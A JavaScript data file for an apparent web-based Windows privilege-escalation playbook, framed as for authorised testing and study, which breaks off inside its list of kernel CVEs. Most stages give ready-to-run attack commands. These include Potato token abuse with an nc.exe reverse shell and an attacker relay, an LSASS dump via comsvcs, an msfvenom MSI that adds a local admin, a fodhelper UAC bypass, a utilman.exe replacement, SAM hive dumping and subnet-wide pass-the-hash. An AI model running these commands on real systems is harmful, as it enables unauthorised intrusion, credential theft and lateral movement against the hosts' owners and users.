/*
  WINDOWS PRIVILEGE ESCALATION MAP — data for windows-privesc-map.html

  Guided, operator-first playbook (same engine as the AD / Cloud maps). Breadth
  is deliberate: when you are out of ideas on a host, open "Out of ideas?" in the
  first stage and work the checklist — every item links to the stage that abuses
  it. Enumeration-focused; weaponisation detail lives in the linked theory/vuln
  pages. Rendered by assets/js/privmap-main.js (reads window.PRIVMAP_DATA).

  Schema per technique: { id, title, desc, cmds[], outcomes[], moveTo[],
  theory{label,url}, vuln{label,url}, cve{label,id,url}, branches[] }.
*/
window.PRIVMAP_DATA = {
  meta: {
    title: "Windows Privilege Escalation — Guided Playbook",
    version: "v2",
    note: "For authorised testing and study only. Start at the top, read your token, enumerate, then follow a finding to its stage. Stuck? Open 'Out of ideas?' and work the checklist."
  },
  palette: { slate: "#94a3b8", blue: "#3b9ee5", amber: "#f59e0b", violet: "#a78bfa", green: "#4ade80" },
  sections: [
    {
      id: "foothold", title: "Low-Privileged Shell", color: "#94a3b8", tag: "Start here",
      desc: "A shell as a standard user or service account. Orient and read your token first — most wins are a misconfiguration away, not a CVE.",
      techniques: [
        { id: "enum-token", title: "whoami /priv + /all — read your token first",
          theory: { label: "Windows Local Privilege Escalation", url: "theory/2026-10-15-windows-local-privilege-escalation.html" },
          vuln: { label: "Toolkit — Windows built-ins", url: "tool-detail.html?tool=windows-builtins" },
          desc: "The single highest-value check. An Enabled (or enable-able) dangerous privilege is usually a direct path to SYSTEM; your integrity level tells you whether UAC is in the way.",
          cmds: ["whoami /priv", "whoami /groups | findstr /i \"Label\"   # Medium = filtered token", "whoami /all"],
          outcomes: [{ label: "Enumeration done", color: "#94a3b8" }],
          moveTo: [
            { section: "token-privs", note: "a dangerous privilege is Enabled / enable-able" },
            { section: "uac", note: "you are a local admin stuck at Medium integrity" }
          ] },
        { id: "enum-auto", title: "Automated enumeration (winPEAS / PrivescCheck / Seatbelt)",
          theory: { label: "Windows Local Privilege Escalation", url: "theory/2026-10-15-windows-local-privilege-escalation.html" },
          desc: "Run one automated pass to surface the whole misconfig surface quickly, then branch from what it flags. Prefer the quiet, targeted checks on a monitored host.",
          cmds: ["winPEAS.exe quiet cmd fast", ".\\PrivescCheck.ps1 -Extended", "Seatbelt.exe -group=all"],
          outcomes: [{ label: "Findings to triage", color: "#94a3b8" }],
          moveTo: [
            { section: "services", note: "weak service perms / unquoted paths / DLL hijack" },
            { section: "scheduled", note: "modifiable tasks or autoruns" },
            { section: "installer-apps", note: "AlwaysInstallElevated / writable PATH / app dirs" },
            { section: "stored-creds", note: "always hunt stored credentials" }
          ] },
        { id: "enum-lotl", title: "Living off the land (native, no uploads)",
          theory: { label: "BloodHound & AD Enumeration", url: "theory/2026-10-09-bloodhound-ad-enumeration.html" },
          vuln: { label: "Toolkit — Windows built-ins", url: "tool-detail.html?tool=windows-builtins" },
          desc: "No internet / EDR watching / can't stage tooling? Enumerate with signed built-ins only (net/net1, dsquery LDAP filters, wmic, PowerShell, sc, schtasks).",
          cmds: ["systeminfo & hostname & whoami /all", "sc query state= all | findstr SERVICE_NAME", "schtasks /query /fo LIST /v | findstr /i \"TaskName Run As User\""],
          outcomes: [{ label: "Enumeration done", color: "#94a3b8" }],
          moveTo: [{ section: "stored-creds", note: "sweep for stored secrets" }] },
        { id: "stuck", title: "\u27f3 Out of ideas? run the full checklist",
          theory: { label: "Windows Local Privilege Escalation", url: "theory/2026-10-15-windows-local-privilege-escalation.html" },
          desc: "When nothing obvious lands, systematically re-walk every escalation surface. Each branch below names the check and the stage that abuses it — tick through them in order.",
          cmds: ["winPEAS.exe quiet cmd fast        # re-run broad, then verify each hit by hand"],
          branches: [
            { label: "1. Token privileges", note: "whoami /priv — SeImpersonate/SeAssignPrimaryToken, SeBackup/SeRestore, SeDebug, SeManageVolume, SeTakeOwnership, SeLoadDriver.", cmds: ["whoami /priv"], outcomes: [{ label: "Dangerous privileges", color: "#3b9ee5" }] },
            { label: "2. Services", note: "writable service binary/dir, weak service DACL (reconfig binPath), unquoted path with a space, service DLL from a writable dir, writable service registry key.", cmds: ["accesschk.exe -uwcqv \"Everyone\" * /accepteula", "wmic service get name,pathname,startname | findstr /i /v \"C:\\Windows\""], outcomes: [{ label: "Service misconfig", color: "#3b9ee5" }] },
            { label: "3. Scheduled tasks & autoruns", note: "a SYSTEM task running a writable script/binary; writable Run key or Startup item.", cmds: ["schtasks /query /fo LIST /v | findstr /i \"TaskName Run As User\""], outcomes: [{ label: "Scheduled / autorun", color: "#f59e0b" }] },
            { label: "4. Installer & app policy", note: "AlwaysInstallElevated (both keys = 1), a writable %PATH% entry before a privileged binary, a writable installed-app directory.", cmds: ["reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", "reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"], outcomes: [{ label: "Installer / app", color: "#f59e0b" }] },
            { label: "5. Stored credentials", note: "unattend.xml, GPP cpassword, Winlogon autologon, cmdkey / Credential Manager, DPAPI, PowerShell history, config files, saved Wi-Fi.", cmds: ["cmdkey /list", "findstr /spin \"password\" C:\\*.xml C:\\*.ini C:\\*.config 2>nul"], outcomes: [{ label: "Credentials", color: "#a78bfa" }] },
            { label: "6. UAC (if local admin at Medium)", note: "auto-elevating binaries / registry hijacks / GUI (msconfig, MMC, azman) reach High with no prompt.", cmds: ["whoami /groups | findstr /i \"Label\""], outcomes: [{ label: "UAC bypass", color: "#3b9ee5" }] },
            { label: "7. Kernel / CVE", note: "match the build + missing hotfixes to a known local-SYSTEM exploit (and look for a loadable vulnerable driver / BYOVD).", cmds: ["systeminfo", "wmic qfe get HotFixID,InstalledOn"], outcomes: [{ label: "Kernel / CVE", color: "#3b9ee5" }] }
          ],
          moveTo: [
            { section: "token-privs", note: "finding 1" },
            { section: "services", note: "finding 2" },
            { section: "scheduled", note: "finding 3" },
            { section: "installer-apps", note: "finding 4" },
            { section: "stored-creds", note: "finding 5" },
            { section: "uac", note: "finding 6" },
            { section: "gui-interactive", note: "interactive/RDP/kiosk session" },
            { section: "kernel", note: "finding 7" }
          ] }
      ]
    },
    {
      id: "token-privs", title: "Dangerous Token Privileges", color: "#3b9ee5", tag: "whoami /priv",
      desc: "Service accounts (IIS, MSSQL, scheduled jobs) frequently hold a privilege that is a direct route to SYSTEM. A privilege shown Disabled still counts — the tool that uses it enables it.",
      techniques: [
        { id: "impersonate", title: "SeImpersonate / SeAssignPrimaryToken (Potato)",
          theory: { label: "Windows Token Abuse & Potato Attacks", url: "theory/2026-10-09-windows-token-potato.html" },
          vuln: { label: "Token Impersonation", url: "vuln-detail.html?vuln=token-impersonation" },
          desc: "Coerce a SYSTEM service to authenticate to a local listener you control, capture its token, and impersonate it. Which 'Potato' works depends on the Windows build and what is running — pick from the branches.",
          cmds: ["whoami /priv | findstr /i \"Impersonate AssignPrimaryToken\""],
          branches: [
            { label: "GodPotato / SigmaPotato — the current default", note: "Broad coverage Server 2012–2022 and Win8–11 via a DCOM/RPC coercion; needs only SeImpersonate. SigmaPotato is a .NET-reflection fork that runs in memory.", cmds: ["GodPotato.exe -cmd \"cmd /c whoami\"", "GodPotato.exe -cmd \"nc.exe <ip> <port> -e cmd.exe\""], outcomes: [{ label: "SYSTEM", color: "#4ade80" }] },
            { label: "PrintSpoofer — when the Print Spooler is up", note: "Abuses the spooler's named pipe. The go-to on Win10 / Server 2016–2019 where Spooler runs.", cmds: ["PrintSpoofer.exe -i -c cmd.exe"], outcomes: [{ label: "SYSTEM", color: "#4ade80" }] },
            { label: "RoguePotato — Spooler off, DCOM reachable", note: "Redirects the OXID resolver through an attacker relay (needs outbound/redirect of 135). Works on Win10 1809+ / Server 2019.", cmds: ["RoguePotato.exe -r <attacker-ip> -e \"cmd.exe\" -l 9999"], outcomes: [{ label: "SYSTEM", color: "#4ade80" }] },
            { label: "EfsPotato / SweetPotato — EFSRPC coercion", note: "Uses the MS-EFSR pipe; SweetPotato bundles several coercion methods (EfsRpc, PrintSpoofer, DCOM).", cmds: ["SweetPotato.exe -e EfsRpc -p cmd.exe -a \"/c whoami\"", "SharpEfsPotato.exe -p C:\\Windows\\System32\\cmd.exe -a \"/c whoami\""], outcomes: [{ label: "SYSTEM", color: "#4ade80" }] },
            { label: "JuicyPotatoNG / JuicyPotato (legacy)", note: "JuicyPotatoNG targets Win10/11 and Server 2019/2022; the original JuicyPotato only works pre-Server 2019 / pre-Win10 1809 where the DCOM CLSID trick is unpatched.", cmds: ["JuicyPotatoNG.exe -t * -p C:\\Windows\\System32\\cmd.exe -a \"/c whoami\""], outcomes: [{ label: "SYSTEM", color: "#4ade80" }] }
          ],
          moveTo: [{ section: "system", note: "a Potato hands you SYSTEM" }] },
        { id: "backup", title: "SeBackup / SeRestore",
          theory: { label: "Windows Credential Storage", url: "theory/2026-08-18-windows-credential-storage.html" },
          vuln: { label: "SeBackup / SeRestore Abuse", url: "vuln-detail.html?vuln=sebackup-serestore" },
          desc: "SeBackup reads any file ignoring the DACL — copy the SAM + SYSTEM hives (or NTDS.dit on a DC) and extract hashes offline. SeRestore writes any file — overwrite a service binary, a SYSTEM-loaded DLL, or utilman.exe.",
          cmds: ["whoami /priv | findstr /i \"Backup Restore\"", "reg save hklm\\sam C:\\Users\\Public\\sam.hive /y & reg save hklm\\system C:\\Users\\Public\\system.hive /y", "robocopy /b C:\\Windows\\System32\\config C:\\Users\\Public SAM SYSTEM"],
          outcomes: [{ label: "SYSTEM creds", color: "#f59e0b" }],
          moveTo: [{ section: "stored-creds", note: "secretsdump the hives -> Administrator hash" }, { section: "system", note: "pass/crack the admin hash" }] },
        { id: "debug", title: "SeDebug",
          theory: { label: "LSASS Dumping & Credential Extraction", url: "theory/2026-10-09-lsass-credential-extraction.html" },
          vuln: { label: "LSASS Dumping", url: "vuln-detail.html?vuln=lsass-dumping" },
          desc: "Open any process. Read or inject into a SYSTEM process, or dump LSASS for everyone's credentials.",
          cmds: ["whoami /priv | findstr /i debug", "# dump LSASS (then parse offline):", "rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\temp\\lsass.dmp full"],
          outcomes: [{ label: "SYSTEM creds", color: "#f59e0b" }],
          moveTo: [{ section: "stored-creds", note: "parse the dump for hashes/tickets" }, { section: "system", note: "inject into a SYSTEM process" }] },
        { id: "managevolume", title: "SeManageVolume",
          theory: { label: "Windows Token Abuse & Potato Attacks", url: "theory/2026-10-09-windows-token-potato.html" },
          desc: "'Perform volume maintenance tasks' — the public SeManageVolumeExploit sets the DACL on C:\\Windows to grant Users full control; from there drop a DLL a SYSTEM service loads (e.g. the missing WptsExtensions.dll loaded by Task Scheduler).",
          cmds: ["whoami /priv | findstr /i ManageVolume", "SeManageVolumeExploit.exe   # grants write over C:\\Windows", "# then plant a hijackable DLL a SYSTEM process loads"],
          outcomes: [{ label: "SYSTEM", color: "#4ade80" }],
          moveTo: [{ section: "services", note: "DLL-hijack a SYSTEM service" }, { section: "system", note: "SYSTEM on next load/reboot" }] },
        { id: "takeownership", title: "SeTakeOwnership",
          theory: { label: "Windows Local Privilege Escalation", url: "theory/2026-10-15-windows-local-privilege-escalation.html" },
          desc: "Take ownership of any securable object, then rewrite its DACL to grant yourself write — e.g. a SYSTEM service binary or utilman.exe — and trigger it.",
          cmds: ["whoami /priv | findstr /i Ownership", "takeown /f C:\\Windows\\System32\\Utilman.exe", "icacls C:\\Windows\\System32\\Utilman.exe /grant <user>:F"],
          outcomes: [{ label: "SYSTEM", color: "#4ade80" }],
          moveTo: [{ section: "gui-interactive", note: "swap utilman.exe -> logon-screen SYSTEM shell" }, { section: "system", note: "overwrite a SYSTEM binary" }] },
        { id: "loaddriver", title: "SeLoadDriver (BYOVD)",
          theory: { label: "Process Injection — Concepts & Detection", url: "theory/2026-10-15-process-injection-and-loaders.html" },
          desc: "Load a driver. Register and load a known-vulnerable signed driver, then exploit it for kernel code execution — also the usual way to blind EDR.",
          cmds: ["whoami /priv | findstr /i LoadDriver", "# register a service key pointing at the vulnerable .sys, then NtLoadDriver"],
          outcomes: [{ label: "Kernel / SYSTEM", color: "#4ade80" }],
          moveTo: [{ section: "kernel", note: "exploit the loaded driver" }, { section: "system", note: "kernel code exec" }] }
      ]
    },
    {
      id: "services", title: "Service Misconfigurations", color: "#3b9ee5", tag: "services",
      desc: "Services usually run as SYSTEM, so any input a low-priv user controls — the binary, its folder, the config, the registry key, a DLL it loads — is a path to SYSTEM.",
      techniques: [
        { id: "weak-perms", title: "Writable service binary or directory",
          theory: { label: "Windows Local Privilege Escalation", url: "theory/2026-10-15-windows-local-privilege-escalation.html" },
          vuln: { label: "Service & Registry Misconfigurations", url: "vuln-detail.html?vuln=windows-service-privesc" },
          desc: "If you can overwrite a SYSTEM service's executable (or drop a DLL/exe into its folder), it runs your code on the next start.",
          cmds: ["accesschk.exe -quvw \"Everyone\" \"C:\\Path\\service.exe\" /accepteula", "copy /y payload.exe \"C:\\Path\\service.exe\"", "sc stop <svc> & sc start <svc>"],
          outcomes: [{ label: "SYSTEM", color: "#4ade80" }],
          moveTo: [{ section: "system", note: "SYSTEM on restart" }] },
        { id: "weak-dacl", title: "Weak service DACL (reconfigure binPath)",
          theory: { label: "Windows Local Privilege Escalation", url: "theory/2026-10-15-windows-local-privilege-escalation.html" },
          vuln: { label: "Service & Registry Misconfigurations", url: "vuln-detail.html?vuln=windows-service-privesc" },
          desc: "SERVICE_CHANGE_CONFIG on a SYSTEM service lets you repoint its binary (note the space after binPath=).",
          cmds: ["accesschk.exe -uwcqv \"Everyone\" * /accepteula   # services you can reconfigure", "sc config <svc> binPath= \"C:\\temp\\rev.exe\" obj= LocalSystem", "sc stop <svc> & sc start <svc>"],
          outcomes: [{ label: "SYSTEM", color: "#4ade80" }],
          moveTo: [{ section: "system", note: "service runs your binary as SYSTEM" }] },
        { id: "unquoted", title: "Unquoted service path",
          theory: { label: "Windows Local Privilege Escalation", url: "theory/2026-10-15-windows-local-privilege-escalation.html" },
          vuln: { label: "Service & Registry Misconfigurations", url: "vuln-detail.html?vuln=windows-service-privesc" },
          desc: "A space in an unquoted path makes Windows try each earlier token first — plant C:\\Program.exe for 'C:\\Program Files\\...'. You need write to that earlier directory.",
          cmds: ["wmic service get name,pathname,startname | findstr /i /v \"\\\"\" | findstr /i /v \"C:\\Windows\"", "# drop the earlier-path binary, then restart the service"],
          outcomes: [{ label: "SYSTEM", color: "#4ade80" }],
          moveTo: [{ section: "system", note: "earlier-path binary runs as SYSTEM" }] },
        { id: "dll-hijack", title: "DLL hijack / phantom DLL",
          theory: { label: "Process Injection — Concepts & Detection", url: "theory/2026-10-15-process-injection-and-loaders.html" },
          desc: "A privileged service that loads a DLL from a writable directory (or looks for one that does not exist) runs your DLL in its context.",
          cmds: ["# ProcMon: filter Result = NAME NOT FOUND, Path ends with .dll, in a writable dir", "# drop a matching DLL (DllMain -> your payload) and restart the service"],
          outcomes: [{ label: "SYSTEM", color: "#4ade80" }],
          moveTo: [{ section: "system", note: "DLL loads into the privileged process" }] },
        { id: "reg-imagepath", title: "Writable service registry key",
          theory: { label: "Windows Local Privilege Escalation", url: "theory/2026-10-15-windows-local-privilege-escalation.html" },
          vuln: { label: "Service & Registry Misconfigurations", url: "vuln-detail.html?vuln=windows-service-privesc" },
          desc: "Write access to HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc> lets you change ImagePath even when sc denies you — same effect as a weak DACL.",
          cmds: ["accesschk.exe -kwuqsv \"Everyone\" hklm\\System\\CurrentControlSet\\Services /accepteula", "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc> /v ImagePath /t REG_EXPAND_SZ /d \"C:\\temp\\rev.exe\" /f"],
          outcomes: [{ label: "SYSTEM", color: "#4ade80" }],
          moveTo: [{ section: "system", note: "service starts your binary" }] }
      ]
    },
    {
      id: "scheduled", title: "Scheduled Tasks & Autoruns", color: "#f59e0b", tag: "scheduled",
      desc: "A privileged task or autorun that executes something you can write, on a trigger you can reach.",
      techniques: [
        { id: "tasks", title: "Modifiable scheduled task",
          theory: { label: "Windows Persistence", url: "theory/2026-10-09-windows-persistence.html" },
          desc: "A task running as SYSTEM/admin whose script, binary, or containing folder is writable. Overwrite the target and wait for (or force) the trigger.",
          cmds: ["schtasks /query /fo LIST /v | findstr /i \"TaskName Run As User Task To Run\"", "# check the ACL on the Task To Run target; overwrite it if writable"],
          outcomes: [{ label: "SYSTEM", color: "#4ade80" }, { label: "admin at logon", color: "#f59e0b" }],
          moveTo: [{ section: "system", note: "task runs your code" }] },
        { id: "autoruns", title: "Writable autorun (Run keys / Winlogon)",
          theory: { label: "Windows Persistence", url: "theory/2026-10-09-windows-persistence.html" },
          desc: "A writable Run/RunOnce value, Winlogon Userinit/Shell, or a referenced binary used by a higher-priv logon runs your code when that user logs in.",
          cmds: ["# enumerate autoruns (winPEAS 'Autoruns' / Sysinternals autorunsc)", "autorunsc.exe -a * -ct /accepteula"],
          outcomes: [{ label: "admin at logon", color: "#f59e0b" }],
          moveTo: [{ section: "system", note: "code runs in the higher-priv logon" }] },
        { id: "startup-folder", title: "Writable Startup folder",
          theory: { label: "Windows Persistence", url: "theory/2026-10-09-windows-persistence.html" },
          desc: "If the all-users Startup folder is writable, a shortcut/binary there runs in the context of the next user (often an admin) to log on.",
          cmds: ["icacls \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\"", "# drop a payload/.lnk; fires at the next interactive logon"],
          outcomes: [{ label: "admin at logon", color: "#f59e0b" }],
          moveTo: [{ section: "system", note: "runs when an admin logs on" }] }
      ]
    },
    {
      id: "installer-apps", title: "Installer & App Misconfig", color: "#f59e0b", tag: "policy / apps",
      desc: "Policy and third-party-app weaknesses that hand a normal user SYSTEM or admin code execution.",
      techniques: [
        { id: "awe", title: "AlwaysInstallElevated",
          theory: { label: "Windows Local Privilege Escalation", url: "theory/2026-10-15-windows-local-privilege-escalation.html" },
          vuln: { label: "Service & Registry Misconfigurations", url: "vuln-detail.html?vuln=windows-service-privesc" },
          desc: "If both policy keys are 1, any user can install an MSI that runs as SYSTEM.",
          cmds: ["reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", "msfvenom -p windows/x64/exec CMD='net localgroup administrators <user> /add' -f msi -o e.msi", "msiexec /quiet /qn /i e.msi"],
          outcomes: [{ label: "SYSTEM", color: "#4ade80" }],
          moveTo: [{ section: "system", note: "the MSI runs as SYSTEM" }] },
        { id: "path-hijack", title: "Writable %PATH% entry (search-order hijack)",
          theory: { label: "Windows Local Privilege Escalation", url: "theory/2026-10-15-windows-local-privilege-escalation.html" },
          desc: "A world-writable directory that appears early in the system %PATH% lets you plant a binary/DLL that a privileged service or task resolves before the real one.",
          cmds: ["# system PATH:", "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /v Path", "icacls C:\\that\\path\\dir   # writable by you + used by a privileged process?"],
          outcomes: [{ label: "SYSTEM", color: "#4ade80" }],
          moveTo: [{ section: "system", note: "privileged process resolves your binary" }] },
        { id: "app-dll", title: "Writable installed-app directory",
          theory: { label: "Process Injection — Concepts & Detection", url: "theory/2026-10-15-process-injection-and-loaders.html" },
          desc: "Third-party apps often install to a writable folder yet run an updater/helper as SYSTEM or at another user's logon. Drop a sideloadable DLL or replace the helper exe.",
          cmds: ["icacls \"C:\\Program Files\\<vendor>\" /t 2>nul | findstr /i \"Everyone Users (M) (W) (F)\"", "# plant a DLL the app loads, or replace a helper the SYSTEM updater runs"],
          outcomes: [{ label: "SYSTEM", color: "#4ade80" }, { label: "admin at logon", color: "#f59e0b" }],
          moveTo: [{ section: "system", note: "the privileged helper loads your code" }] }
      ]
    },
    {
      id: "uac", title: "UAC Bypass (medium \u2192 high)", color: "#3b9ee5", tag: "integrity",
      desc: "You are in the local Administrators group but running at Medium integrity (a filtered token). A UAC bypass gets you a High-integrity context without a prompt — not a cross-account jump, but it unlocks the SYSTEM routes.",
      techniques: [
        { id: "uac-registry", title: "Auto-elevate + registry/COM hijack",
          theory: { label: "Windows Access Tokens & UAC", url: "theory/2026-08-18-windows-tokens-uac.html" },
          vuln: { label: "UAC Bypass", url: "vuln-detail.html?vuln=uac-bypass" },
          desc: "Signed auto-elevating binaries read an attacker-writable HKCU handler, or an elevated COM object is created fileless. fodhelper / computerdefaults / eventvwr / sdclt / the CMSTPLUA COM moniker are the staples — UACME automates 70+.",
          cmds: ["whoami /groups | findstr /i \"Label\"   # confirm Medium", "reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /ve /d \"cmd.exe /c start cmd.exe\" /f", "reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /v DelegateExecute /t REG_SZ /d \"\" /f", "fodhelper.exe"],
          outcomes: [{ label: "high integrity", color: "#4ade80" }],
          moveTo: [{ section: "token-privs", note: "High integrity -> your token's privileges unlock" }, { section: "system", note: "elevated routes open up" }] },
        { id: "uac-gui", title: "GUI / interactive UAC bypass",
          theory: { label: "Windows Local Privilege Escalation", url: "theory/2026-10-15-windows-local-privilege-escalation.html" },
          vuln: { label: "UAC Bypass (GUI methods)", url: "vuln-detail.html?vuln=uac-bypass" },
          desc: "On an interactive/RDP session, spawn a shell from an auto-elevating GUI with no registry write: msconfig Tools->Launch, an MMC snap-in's Help Topics / Export-List / file dialog (azman.msc, UACME #55), or a 'highest privileges' scheduled task.",
          cmds: ["msconfig            # Tools tab -> Command Prompt -> Launch (High-IL child)", "azman.msc           # Help -> Help Topics -> file dialog -> cmd.exe"],
          outcomes: [{ label: "high integrity", color: "#4ade80" }],
          moveTo: [{ section: "gui-interactive", note: "more interactive/kiosk breakouts" }, { section: "system", note: "elevated routes open up" }] }
      ]
    },
    {
      id: "gui-interactive", title: "GUI / Kiosk / Interactive Escalation", color: "#a78bfa", tag: "interactive",
      desc: "On a console, RDP, kiosk or Citrix/RDS session, a graphical surface that already runs higher can be walked into a shell. A child process inherits its parent's token — make a High/SYSTEM GUI launch anything and that thing runs at the parent's level.",
      techniques: [
        { id: "gui-system", title: "Break out of a GUI running as SYSTEM/admin",
          theory: { label: "Windows Local Privilege Escalation", url: "theory/2026-10-15-windows-local-privilege-escalation.html" },
          vuln: { label: "UAC Bypass (GUI methods)", url: "vuln-detail.html?vuln=uac-bypass" },
          desc: "Vendor updaters, installers, 'repair' wizards and setup UIs often sit on the interactive desktop as SYSTEM. Use their Open / Save As / Browse / Print / Help dialog to spawn a child — type cmd.exe in the filename/address box, or right-click an .exe -> Open.",
          cmds: ["# in any File dialog of the elevated app, filename/address box:", "cmd.exe", "%windir%\\system32\\cmd.exe"],
          outcomes: [{ label: "SYSTEM", color: "#4ade80" }],
          moveTo: [{ section: "system", note: "child inherits SYSTEM/admin" }] },
        { id: "accessibility", title: "Accessibility SYSTEM shell (sethc / utilman)",
          theory: { label: "Windows Persistence", url: "theory/2026-10-09-windows-persistence.html" },
          desc: "Replace or IFEO-hijack sethc.exe (Shift x5) or utilman.exe (Win+U) with cmd.exe — then at the logon/lock screen the shell runs as SYSTEM, before any login. Needs the write (SeRestore/SeTakeOwnership or offline access).",
          cmds: ["# with write to System32 (e.g. via SeBackup/SeRestore or offline):", "copy /y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe", "# then Win+U at the lock screen -> nt authority\\system"],
          outcomes: [{ label: "SYSTEM", color: "#4ade80" }],
          moveTo: [{ section: "system", note: "SYSTEM shell at the logon screen" }] },
        { id: "kiosk", title: "Kiosk / Citrix / RDS published-app breakout",
          theory: { label: "Windows Local Privilege Escalation", url: "theory/2026-10-15-windows-local-privilege-escalation.html" },
          desc: "Break out of the one allowed app through common dialogs, hyperlinks, an embedded browser, or a Save-As address bar to reach Explorer/cmd on the host, then enumerate like any foothold. Classic on locked-down terminals and Citrix/RDS farms.",
          cmds: ["# Print -> 'Find a printer' / 'Print to file'; Help -> 'Jump to URL' into a browser;", "# a Save-As dialog address bar -> type cmd.exe ; right-click -> 'Open file location'"],
          outcomes: [{ label: "Shell on the host", color: "#94a3b8" }],
          moveTo: [{ section: "foothold", note: "now enumerate the host for SYSTEM" }] }
      ]
    },
    {
      id: "stored-creds", title: "Stored Credentials & Secrets", color: "#a78bfa", tag: "loot",
      desc: "Hosts accumulate secrets that skip escalation entirely by handing you a higher-privileged account — and, once you are admin, the local secret stores give you the rest.",
      techniques: [
        { id: "files-reg", title: "Unattend / GPP / registry / cmdkey",
          theory: { label: "Windows Credential Storage", url: "theory/2026-08-18-windows-credential-storage.html" },
          vuln: { label: "GPP cpassword", url: "vuln-detail.html?vuln=gpp-passwords" },
          desc: "Answer files, Group Policy Preferences cpassword, Winlogon autologon, saved RDP / Credential Manager entries, config files and scripts.",
          cmds: ["findstr /spin \"password\" C:\\*.xml C:\\*.ini C:\\*.config 2>nul", "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"", "cmdkey /list"],
          outcomes: [{ label: "admin creds", color: "#f59e0b" }],
          moveTo: [{ section: "system", note: "reuse the recovered account" }] },
        { id: "credman-dpapi", title: "Credential Manager & DPAPI",
          theory: { label: "Windows Credential Storage", url: "theory/2026-08-18-windows-credential-storage.html" },
          vuln: { label: "DPAPI Abuse", url: "vuln-detail.html?vuln=dpapi-abuse" },
          desc: "The Windows Vault and DPAPI-protected blobs (saved logins, RDP, Wi-Fi, app secrets) decrypt with the user's masterkey — or, as SYSTEM, with the DPAPI backup key.",
          cmds: ["vaultcmd /listcreds:\"Windows Credentials\" /all", "# SharpDPAPI / mimikatz dpapi:: to decrypt masterkeys + blobs"],
          outcomes: [{ label: "credentials", color: "#f59e0b" }],
          moveTo: [{ section: "system", note: "reuse decrypted credentials" }] },
        { id: "browser", title: "Browser credentials & tokens",
          theory: { label: "Browser Credential & Token Theft", url: "theory/2026-10-15-browser-credential-theft.html" },
          desc: "Saved logins, cookies and session tokens in Chrome/Edge/Firefox profiles — often reused for admin portals and cloud.",
          cmds: ["# decrypt with the user's DPAPI key (and App-Bound Encryption key on recent Chrome)"],
          outcomes: [{ label: "credentials / sessions", color: "#f59e0b" }],
          moveTo: [{ section: "system", note: "reuse creds / hijack sessions" }] },
        { id: "sam-lsa", title: "SAM + SYSTEM / LSA secrets (admin)",
          theory: { label: "Windows Credential Storage", url: "theory/2026-08-18-windows-credential-storage.html" },
          vuln: { label: "SAM & LSA Secrets", url: "vuln-detail.html?vuln=sam-lsa-secrets" },
          desc: "With admin, dump the local SAM for account hashes and LSA secrets for service-account passwords / cached domain logons. A reused local-admin hash pass-the-hashes the whole fleet.",
          cmds: ["reg save hklm\\sam sam.hive & reg save hklm\\system system.hive", "impacket-secretsdump -sam sam.hive -system system.hive LOCAL", "netexec smb 10.10.10.0/24 -u administrator -H <nthash> --local-auth"],
          outcomes: [{ label: "admin hashes", color: "#f59e0b" }],
          moveTo: [{ section: "system", note: "pass-the-hash onward" }] },
        { id: "lsass", title: "Dump LSASS (admin / SeDebug)",
          theory: { label: "LSASS Dumping & Credential Extraction", url: "theory/2026-10-09-lsass-credential-extraction.html" },
          vuln: { label: "LSASS Dumping", url: "vuln-detail.html?vuln=lsass-dumping" },
          desc: "LSASS holds NT hashes, Kerberos keys/tickets and sometimes cleartext for everyone logged on — the richest single source once you hold admin/SeDebug.",
          cmds: ["rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\temp\\l.dmp full", "# parse offline: mimikatz sekurlsa::minidump + sekurlsa::logonpasswords / ekeys"],
          outcomes: [{ label: "domain creds / tickets", color: "#f59e0b" }],
          moveTo: [{ section: "system", note: "reuse creds / tickets to pivot" }] }
      ]
    },
    {
      id: "kernel", title: "Kernel, Driver & CVE Exploits", color: "#3b9ee5", tag: "CVE",
      desc: "When the host is behind on patches, a local-SYSTEM exploit may be a shortcut — but match the build and hotfixes carefully and weigh the stability/OPSEC cost before firing one.",
      techniques: [
        { id: "cve", title: "Patch-level / fast-path CVEs",
          theory: { label: "Fast-Path CVEs", url: "theory/2026-09-24-fast-path-cves.html" },
          vuln: { label: "PrintNightmare", url: "vuln-detail.html?vuln=printnightmare" },
          desc: "Compare the OS build and missing hotfixes to known local-SYSTEM CVEs; verify applicability before running. The branches are the usual high-value ones.",
          cmds: ["systeminfo", "wmic qfe get HotFixID,InstalledOn", "# map build + hotfixes to a known local-SYSTEM CVE (e.g. WES-NG / winPEAS)"],
          branches: [
            { label: "PrintNightmare — Print Spooler driver install", cve: "CVE-2021-34527", note: "Authenticated user installs a malicious printer driver and runs code as SYSTEM (also the RCE CVE-2021-1675). Needs the Spooler running.", cmds: ["Invoke-Nightmare   # or the SharpPrintNightmare / CVE-2021-1675 PoC"], outcomes: [{ label: "SYSTEM", color: "#4ade80" }] },
            { label: "HiveNightmare / SeriousSAM — world-readable hives", cve: "CVE-2021-36934", note: "Overly permissive ACLs on the SAM/SYSTEM/SECURITY hives let a non-admin read them from a VSS shadow copy and extract the local admin hash. Win10/11 1809+.", cmds: ["# read \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyN\\Windows\\System32\\config\\SAM", "impacket-secretsdump -sam SAM -system SYSTEM LOCAL"], outcomes: [{ label: "admin hash", color: "#f59e0b" }] },
            { label: "CLFS driver EoP (exploited in the wild)", cve: "CVE-2023-28252", note: "Common Log File System kernel driver flaw used by ransomware for SYSTEM; one of several CLFS EoPs — match the patch level.", outcomes: [{ label: "SYSTEM", color: "#4ade80" }] },
